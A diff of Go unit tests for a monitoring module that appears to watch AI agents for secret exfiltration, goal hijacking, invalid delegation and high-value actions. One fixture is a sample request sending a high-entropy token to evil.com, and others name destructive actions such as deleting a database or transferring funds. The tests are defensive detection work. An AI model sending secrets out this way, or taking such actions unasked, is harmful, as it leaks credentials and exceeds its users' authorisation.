@@ -903,5 +903,165 @@ func TestWebFetchMonitor_InternalOnly_NoLateralMovement(t *testing.T) {
 	}
 }
 
+// ─── PII Exfiltration via URL Parameters ─────────────────────────────────────
+
+func TestWebFetchMonitor_PIIExfiltration(t *testing.T) {
+	wm := NewAgentWebFetchMonitor()
+
+	// High-entropy secret in URL parameter (should trigger)
+	result := wm.RecordFetch("agent-pii",
+		"https://evil.com/track?token=aB3kLmNpQrStUvWxYz1234567890abcdefghijklm",
+		"evil.com", "text/html")
+	if !result.PIIExfiltration {
+		t.Error("expected PIIExfiltration=true for high-entropy token in URL params")
+	}
+
+	// Short value (should NOT trigger)
+	result = wm.RecordFetch("agent-pii",
+		"https://example.com/api?token=short",
+		"example.com", "text/html")
+	if result.PIIExfiltration {
+		t.Error("expected PIIExfiltration=false for short token value")
+	}
+
+	// No PII param at all (should NOT trigger)
+	result = wm.RecordFetch("agent-pii",
+		"https://example.com/page",
+		"example.com", "text/html")
+	if result.PIIExfiltration {
+		t.Error("expected PIIExfiltration=false for URL without PII params")
+	}
+}
+
+// ─── Shannon Entropy ─────────────────────────────────────────────────────────
+
+func TestShannonEntropy(t *testing.T) {
+	// Repeated character = low entropy
+	e := shannonEntropy("aaaaaaaaaa")
+	if e > 0.1 {
+		t.Errorf("expected low entropy for repeated chars, got %f", e)
+	}
+
+	// Random-looking string = high entropy
+	e = shannonEntropy("aB3kLmNpQrStUvWxYz1234567890")
+	if e < 3.5 {
+		t.Errorf("expected high entropy for random-looking string, got %f", e)
+	}
+
+	// Empty string
+	e = shannonEntropy("")
+	if e != 0 {
+		t.Errorf("expected 0 entropy for empty string, got %f", e)
+	}
+}
+
+// ─── Goal-Action Alignment ───────────────────────────────────────────────────
+
+func TestGoalHijackMonitor_DestructiveVsReadOnly(t *testing.T) {
+	gm := NewGoalHijackMonitor()
+
+	// Register a read-only goal
+	gm.Analyze("agent-1", "Search the codebase for security bugs", "user")
+
+	// Destructive action should be flagged
+	if !gm.IsDestructiveVsReadOnly("agent-1", "delete", "file_delete") {
+		t.Error("expected destructive action to be flagged when goal is read-only")
+	}
+
+	// Read action should NOT be flagged
+	if gm.IsDestructiveVsReadOnly("agent-1", "read", "file_read") {
+		t.Error("expected read action to NOT be flagged when goal is read-only")
+	}
+
+	// Unknown agent should not be flagged
+	if gm.IsDestructiveVsReadOnly("unknown-agent", "delete", "file_delete") {
+		t.Error("expected unknown agent to NOT be flagged")
+	}
+}
+
+func TestGoalHijackMonitor_DestructiveGoalAllowed(t *testing.T) {
+	gm := NewGoalHijackMonitor()
+
+	// Register a destructive goal
+	gm.Analyze("agent-2", "Delete all temporary files from the staging server", "user")
+
+	// Destructive action should NOT be flagged (goal is already destructive)
+	if gm.IsDestructiveVsReadOnly("agent-2", "delete", "file_delete") {
+		t.Error("expected destructive action to be allowed when goal is also destructive")
+	}
+}
+
+// ─── Delegation Verification ─────────────────────────────────────────────────
+
+func TestDelegationTracker_HasValidDelegation(t *testing.T) {
+	dt := NewDelegationChainTracker()
+
+	// No delegation → invalid
+	valid, _ := dt.HasValidDelegation("agent-1")
+	if valid {
+		t.Error("expected invalid delegation for unregistered agent")
+	}
+
+	// Register valid delegation
+	futureExpiry := time.Now().Add(1 * time.Hour).Format(time.RFC3339)
+	dt.ValidateDelegation("agent-1", "admin@corp.com", "read,write", futureExpiry, "", "signed-token")
+
+	// Should now be valid
+	valid, delegatedBy := dt.HasValidDelegation("agent-1")
+	if !valid {
+		t.Error("expected valid delegation after registration")
+	}
+	if delegatedBy != "admin@corp.com" {
+		t.Errorf("expected delegatedBy 'admin@corp.com', got %q", delegatedBy)
+	}
+}
+
+func TestDelegationTracker_ExpiredDelegation(t *testing.T) {
+	dt := NewDelegationChainTracker()
+
+	// Register expired delegation
+	pastExpiry := time.Now().Add(-1 * time.Hour).Format(time.RFC3339)
+	dt.ValidateDelegation("agent-expired", "user@corp.com", "read", pastExpiry, "", "signed")
+
+	// Should be invalid (expired)
+	valid, _ := dt.HasValidDelegation("agent-expired")
+	if valid {
+		t.Error("expected invalid delegation for expired record")
+	}
+}
+
+// ─── High-Value Action Detection ─────────────────────────────────────────────
+
+func TestIsHighValueAction(t *testing.T) {
+	if !isHighValueAction("delete_database", "", "") {
+		t.Error("expected 'delete_database' to be high-value")
+	}
+	if !isHighValueAction("", "transfer", "bank_account") {
+		t.Error("expected transfer to be high-value")
+	}
+	if isHighValueAction("read", "file_read", "/tmp/log.txt") {
+		t.Error("expected read action to NOT be high-value")
+	}
+}
+
+// ─── New Mitigation Types ────────────────────────────────────────────────────
+
+func TestGetContainmentMitigations_NewTypes(t *testing.T) {
+	newTypes := []string{
+		"agent_pii_exfiltration",
+		"agent_goal_misalignment",
+		"delegation_verification_failed",
+	}
+	for _, at := range newTypes {
+		mitigations := getContainmentMitigations(at)
+		if len(mitigations) == 0 {
+			t.Errorf("getContainmentMitigations(%q) returned empty", at)
+		}
+		if mitigations[0] == "Review and restrict AI agent permissions" {
+			t.Errorf("getContainmentMitigations(%q) returned generic fallback", at)
+		}
+	}
+}
+
 // Compile-time interface check
 var _ core.Module = (*Containment)(nil)
